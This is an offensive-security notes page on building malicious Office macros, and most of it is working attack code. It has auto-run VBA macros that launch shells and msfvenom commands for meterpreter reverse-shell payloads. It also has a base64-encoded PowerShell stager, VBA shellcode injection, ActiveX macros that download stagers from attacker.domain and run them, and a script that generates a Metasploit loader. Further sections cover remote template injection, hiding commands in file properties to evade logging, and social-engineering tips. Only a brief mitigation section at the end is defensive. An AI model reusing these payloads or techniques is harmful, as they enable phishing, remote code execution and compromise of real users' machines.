# ⭕ Office Macros

{% embed url="https://levelup.gitconnected.com/ethical-hacking-part-13-office-macro-attacks-3a8a0cad14b7" %}

to create a macro in an office word document:

* Create new word document (CTRL+N)
* Hit ALT+F11 to go into Macro editor
* Double click into the "This document" and CTRL+C/V the below:

```vba
Private Sub Document_Open()
  MsgBox "game over", vbOKOnly, "game over"
  a = Shell("C:\tools\shell.cmd", vbHide)
End Sub
```

![](<../../.gitbook/assets/image (14).png>)

ALT+F11 to switch back to the document editing mode and add a flair of social engineering like so:

![](<../../.gitbook/assets/image (24) (1) (1).png>)

Save the file as a macro enabled document, for example a Doc3.dotm:

![](<../../.gitbook/assets/image (19) (1) (1) (1).png>)

Victim launching the Doc3.dotm:

![](<../../.gitbook/assets/image (13).png>)

a message box will appear.

#### <mark style="color:green;">generate reverse shell macro payload for office word:</mark>

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=3333 -e x86/shikata_ga_nai -f vba-psh > macro.
```

## <mark style="color:red;">Generating VBA Macros</mark>

* Paste the output of the first portion of the payload script into the editor, save it.
* Paste the remainder of the script into the word document itself. This is when you would perform the client-side attack by emailing this Word document to someone.

```
#Msfvenom
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PN> -e x86/shikata_ga_nai -f vba-exe   
msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread
#Other formats:
-f vba-psh, vba (No need to follow below steps)

'* This code is now split into two pieces:
'*  1. The Macro. This must be copied into the Office document
'*     macro editor. This macro will run on startup.
'*
'*  2. The Data. The hex dump at the end of this output must be
'*     appended to the end of the document contents.

```

```powershell
#Convert to Base64 Encoding
$command = "calc"
$bytes = [Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
echo $encodedCommand

powershell.exe -nop -w hidden -e $encodedCommand
```

**Reference**

* [https://www.docdroid.net/HlWNL0K/virus-inside-ms-word-doc-pdf#](https://www.docdroid.net/HlWNL0K/virus-inside-ms-word-doc-pdf)
* [Cheatsheet](https://gist.github.com/mgeeky/9dee0ac86c65cdd9cb5a2f64cef51991)
* [Tactic: Without AutoOpen()](https://infosecwriteups.com/fun-with-creating-a-vbs-payload-to-bypass-endpoint-security-and-other-layers-44afd724de1b)

#### Sharpshooter

* Reference: MDSec [Sharpshooter](https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/)

## <mark style="color:red;">Custom Macro Development</mark>

### &#x20;<mark style="color:orange;">****</mark> <mark style="color:orange;"></mark><mark style="color:orange;">Msfvenom +  Unicorn</mark>

```
msfvenom -p /windows/x64/meterpreter/reverse_http LHOST=eth0 LPORT=443 -f csharp -o payload.cs

git clone https://github.com/trustedsec/unicorn.git
python unicorn.py <path to payload.cs> shellcode macro
```

Embed as macro in Word

### &#x20;<mark style="color:orange;">MaliciousMacroGenerator</mark>

{% embed url="https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator" %}

### <mark style="color:orange;">**Remote Template Injection**</mark>

DOCX files referencing a template that includes macros can "execute" macros as well.

* `File > Options > Add-ins > Manage:Templates - Go`
* This method bypasses email filters that block .dotm files.
* References
  * [Remote-Template Injection](http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html)
  * [IREDTeam](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/inject-macros-from-a-remote-dotm-template-docx-with-macros)

**1]** Create a .DOTM template document containing Macros

**2]** Create a .DOCX file from Word default templates -> Rename as .zip -> Extract .zip -> Modify `word\_rels\settings.xml.rels`

![](<../../.gitbook/assets/image (33) (1) (1) (1).png>)

**3]** Save file → Select all unzipped files and zip → Change extension to .docx

**4]** Execution

* Opening the document creates 4 HTTP requests.
* Even without enable documents you can see if the doc was opened. → Good for metrics

### <mark style="color:orange;">Hidden in File Properties - Stdin to Avoid Logging</mark>

* Command resides in "Author"/ Custom Excel form / Encoded form.
* Hides PS commands from cmdline logging via invocation with StdIn.WriteLine
* Trigger from a button.
* Leveraging unused code for obfuscation.

```vba
Public Sub PrintDocumentProperties()
    Dim oApp As New Excel.Application
    Dim oWB As Workbook
    Set oWB = ActiveWorkbook
    
    Dim Exec As String
    
    #If VBA7 Then
Dim rwxpage As LongPtr, res As LongPtr
#Else
Dim rwxpage As Long, res As Long
#End If

    Dim author As String
    author = oWB.BuiltinDocumentProperties("Author")
    
    Set objWshell = VBA.CreateObject("WScript.Shell")
    
Dim c As String
Const quote As String = """"

c = "WwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AUwBlAHIAdgBpAEMAZQBQAE8ASQBOAHQATQBhAE4AYQBnAEUAUgBdADoAOgBFAFgAcABlAEMAVAAxADAAMABDAG8AbgB0AGkATgBVAEUAIAA9ACAAMAA7ACQAVwBjAD0ATgBlAFcALQBPAEIASgBFAGMAVAAgAFMAWQBTAHQAZQBNAC4ATgBlAFQALgBXAGUAYgBDAEwAaQBlAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAQwAuAEgARQBhAEQAZQByAHMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAUgBPAFgAeQAgAD0AIABbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBXAEUAQgBSAEUAcQB1AEUAcwB0AF0AOgA6AEQARQBGAEEAVQBMAFQAVwBFAEIAUABSAE8AWAB5ADsAJABXAEMALgBQAFIATwBYAFkALgBDAFIARQBEAGUATgBUAEkAQQBsAHMAI"
c = c + "AA9ACAAWwBTAFkAcwBUAGUAbQAuAE4ARQB0AC4AQwByAEUAZABFAG4AVABJAEEAbABDAEEAYwBoAEUAXQA6ADoARABlAGYAQQBVAGwAdABOAEUAdAB3AG8AUgBLAEMAcgBlAGQAZQBuAHQAaQBhAGwAUwA7ACQASwA9ACcAMwBlACoARwBrAFkATABVAFMAdgA2AGEAYgA0AE8ASwAhACUAUABpAEAAJAB0AHEAOQBcAD4AfAB+AHUAKwBSACcAOwAkAGkAPQAwADsAWwBjAGgAQQBSAFsAXQBdACQAYgA9ACgAWwBjAEgAYQByAFsAXQBdACgAJABXAGMALgBEAE8AdwBOAEwATwBBAEQAUwB0AFIAaQBOAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIALgA3ADoAOAAwADgAMAAvAGkAbgBkAGUAeAAuAGEAcwBwACIAKQApACkAfAAlAHsAJABfAC0AYgBYAG8AcgAkAGsAWwAkAEkAKwArACUAJABLAC4ATABlAG4AZwB0AGgAXQB9ADsASQBFAFgAIAAoACQAQgAtAEoATwBJAE4AJwAnACkA"

Dim objWshell1 As Object
Set objWshell1 = CreateObject("WScript.Shell")
With objWshell1.Exec("powershell.exe -nop -windowstyle hidden -Command -")
.StdIn.WriteLine author
.StdIn.WriteBlankLines 1
.Terminate
End With
      
End Sub
```

## <mark style="color:red;">Shellcode Injection with Macro</mark>

This is a simple implementation of a shellcode execution which uses VirtualAlloc, CreateThread, and RtlMoveMemory to execute shellcode.

```vba
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes
As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As
LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As
LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As
Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As
LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
 Dim buf As Variant
 Dim addr As LongPtr
 Dim counter As Long
 Dim data As Long
 Dim res As Long

 buf = Array(shellcode array)

 addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

 For counter = LBound(buf) To UBound(buf)
  data = buf(counter)
  res = RtlMoveMemory(addr + counter, data, 1)
 Next counter

 res = CreateThread(0, 0, addr, 0, 0, 0)
End Function
Sub Document_Open()
 MyMacro
 
End Sub
Sub AutoOpen()
 MyMacr
```

## <mark style="color:red;">ActiveX Control for Macro Execution</mark>

* Idea is to move away from traditionally used AutoOpen() and Document\_Open() which are noisy.
* `File > Options > Customize Ribbon > Developer Tab > Controls > Legacy Tools > More Options`
* Each ActiveX control gives the option to add macros to its procedures.
* [Leveraging Microsoft Ink Picture Control](https://www.greyhathacker.net/?p=948)

```vba
#InkEdit Procedure - Ondisk footprint

Sub InkEdit1_GotFocus()
Run = Shell("cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile('https://trusted.domain/file.exe',‘file.exe');Start-Process ‘file.exe'", vbNormalFocus)
End Sub

#Inmemory execution

Sub InkEdit1_GotFocus()
Debugging
End Sub

Public Function Debugging() As Variant
    Const HIDDEN_WINDOW = 0
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW
    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
    objProcess.Create "powe" & "rshell.e" & "xe" & " -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c if ([IntPtr]::size -eq 4) {(new-object Net.WebClient).DownloadString('https://attacker.domain/stager1.ps1') | iex } else {(new-object Net.WebClient).DownloadString('https://attacker.domain/stager2.ps1') | iex}"
End Function
```

Procedures able to automatically run macros :&#x20;

![](<../../.gitbook/assets/image (9) (1) (1).png>)

## <mark style="color:red;">OS-aware Macro</mark>

* Retrieves OS, hostname, username & sends to attacker server.
* Link to [script](https://gist.github.com/anonymous/db37338ba9c59336a0ee3d324d152bc9)

## <mark style="color:red;">RTF + Signed Binary + DLL Hijacking + Custom MSF Loader</mark>

* Macro > Contains RTF > Contains Signed binary + DLL as OLE objects
* Combined RTF's default behaviour of dropping OLE objects to TEMP folder, with DLL Hijacking vulnerability of trusted Kaspersky executable and custom-made MSF loader.
* [Custom Metasploit Loader](https://github.com/rsmudge/metasploit-loader)
* Kaspersky's [kavremover.exe](https://support.kaspersky.com/downloads/utils/kavremover.exe)
* Reference:
  * [Part-1](https://astr0baby.wordpress.com/2014/02/12/custom-meterpreter-loader-dll/)
  * [Part-2](https://astr0baby.wordpress.com/2014/02/13/customising-meterpreter-loader-dll-part-2/)

```bash
#Metasploit Loader Generator:  Usage: ./loader.sh

#!/bin/bash
clear
echo "****************************************************************"
echo "    Automatic C source code generator - FOR METASPLOIT          "
echo "           Based on rsmudge metasploit-loader                   "
echo "****************************************************************"
echo -en 'Metasploit server IP : '
read ip
echo -en 'Metasploit port number : '
read port

echo '#include <stdio.h>'> temp.c
echo '#include <stdlib.h>' >> temp.c
echo '#include <windows.h>' >> temp.c
echo '#include <winsock2.h>' >> temp.c
echo -n 'unsigned char server[]="' >> temp.c
echo -n $ip >> temp.c
echo -n '";' >> temp.c
echo '' >> temp.c
echo -n 'unsigned char serverp[]="' >> temp.c
echo -n $port >> temp.c
echo -n '";' >> temp.c
echo '' >> temp.c
echo 'void winsock_init() {' >> temp.c
echo '    WSADATA    wsaData;' >> temp.c
echo '    WORD    wVersionRequested;' >> temp.c
echo '    wVersionRequested = MAKEWORD(2, 2);'>> temp.c
echo '    if (WSAStartup(wVersionRequested, &wsaData) < 0) {' >> temp.c
echo '         printf("bad\n"); '>> temp.c
echo '         WSACleanup(); '>> temp.c
echo '        exit(1);'>> temp.c
echo '    }' >> temp.c
echo ' }' >> temp.c
echo ' void punt(SOCKET my_socket, char * error) {' >> temp.c
echo '    printf("r %s\n", error);'>> temp.c
echo '    closesocket(my_socket);'>> temp.c
echo '    WSACleanup();'>> temp.c
echo '    exit(1);' >> temp.c
echo ' }' >> temp.c
echo ' int recv_all(SOCKET my_socket, void * buffer, int len) {' >> temp.c
echo '    int    tret   = 0;'>> temp.c
echo '    int    nret   = 0;'>>temp.c
echo '    void * startb = buffer;'>> temp.c
echo '    while (tret < len) {'>>temp.c
echo '        nret = recv(my_socket, (char *)startb, len - tret, 0);'>> temp.c
echo '        startb += nret;'>> temp.c
echo '        tret   += nret;'>>temp.c
echo '         if (nret == SOCKET_ERROR)'>> temp.c
echo '            punt(my_socket, "no data");'>> temp.c
echo '    }'>>temp.c
echo '    return tret;'>> temp.c
echo '}' >> temp.c
echo 'SOCKET wsconnect(char * targetip, int port) {'>> temp.c
echo '    struct hostent *        target;' >> temp.c
echo '    struct sockaddr_in     sock;' >> temp.c
echo '    SOCKET             my_socket;'>>temp.c
echo '    my_socket = socket(AF_INET, SOCK_STREAM, 0);'>> temp.c
echo '     if (my_socket == INVALID_SOCKET)'>> temp.c
echo '        punt(my_socket, ".");'>>temp.c
echo '    target = gethostbyname(targetip);'>>temp.c
echo '    if (target == NULL)'>>temp.c
echo '        punt(my_socket, "..");'>>temp.c
echo '    memcpy(&sock.sin_addr.s_addr, target->h_addr, target->h_length);'>>temp.c
echo '    sock.sin_family = AF_INET;'>> temp.c
echo '    sock.sin_port = htons(port);'>>temp.c
echo '    if ( connect(my_socket, (struct sockaddr *)&sock, sizeof(sock)) )'>>temp.c
echo '         punt(my_socket, "...");'>>temp.c
echo '    return my_socket;'>>temp.c
echo '}' >> temp.c
echo 'int main(int argc, char * argv[]) {' >> temp.c
echo '  FreeConsole();'>>temp.c
echo '    ULONG32 size;'>>temp.c
echo '    char * buffer;'>>temp.c
echo '    void (*function)();'>>temp.c
echo '    winsock_init();'>> temp.c
echo '    SOCKET my_socket = wsconnect(server, atoi(serverp));'>>temp.c
echo '    int count = recv(my_socket, (char *)&size, 4, 0);'>>temp.c
echo '    if (count != 4 || size <= 0)'>>temp.c
echo '        punt(my_socket, "error lenght\n");'>>temp.c
echo '    buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);'>>temp.c
echo '    if (buffer == NULL)'>>temp.c
echo '        punt(my_socket, "error in buf\n");'>>temp.c
echo '    buffer[0] = 0xBF;'>>temp.c
echo '    memcpy(buffer + 1, &my_socket, 4);'>>temp.c
echo '    count = recv_all(my_socket, buffer + 5, size);'>>temp.c
echo '    function = (void (*)())buffer;'>>temp.c
echo '    function();'>>temp.c
echo '    return 0;'>>temp.c
echo '}' >> temp.c
echo 'Compiling C code to Dll ..'
i586-mingw32msvc-gcc  temp.c -o msi.dll -lws2_32 -shared
strip msi.dll
ls -la msi.dll


-----------------
#Export to exe. Test Payload with main.c
i586-mingw32msvc-gcc temp.c -o payload.exe -lws2_32 -mwindows

#Explort to dll
i586-mingw32msvc-gcc temp.c -o msi.dll -lws2_32 -shared
strip msi.dll

#Test dll
rundll32 msi.dll,main
```

* Combining with Macro

![](<../../.gitbook/assets/image (45) (1) (1).png>)

## <mark style="color:red;">Embedding Executable/Dll in a Macro (executable2vbs)</mark>

* Contains an embedded executable in the form of hex dumps in strings.&#x20;
* Executable is re-assembled dropped in a temporary directory and executed.
* [Didier Steven's file2fbsscript python script](https://didierstevens.com/files/software/file2vbscript\_v0\_3.zip)
* On-disk footprint is high. Use an evasing executable/DLL.

![](<../../.gitbook/assets/image (17) (1) (1).png>)

## <mark style="color:red;">Other Tools</mark>



{% embed url="https://github.com/MartinSohn/Office-phish-templates" %}

{% embed url="https://github.com/infosecn1nja/MaliciousMacroMSBuild" %}

{% embed url="https://github.com/sevagas/macro_pack" %}

## <mark style="color:red;">Mitigation</mark>

* On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Office applications from creating child processes and from writing potentially malicious executable content to disk.
* Follow Office macro security best practices suitable for your environment. Disable Office VBA macros from executing.
* Disable Office add-ins. If they are required, follow best practices for securing them by requiring them to be signed and disabling user notification for allowing add-ins. For some add-ins types (WLL, VBA) additional mitigation is likely required as disabling add-ins in the Office Trust Center does not disable WLL nor does it prevent VBA code from executing.

{% embed url="https://www.wpninjas.ch/2020/01/defense-in-depth-on-an-example-office-macro-protection" %}
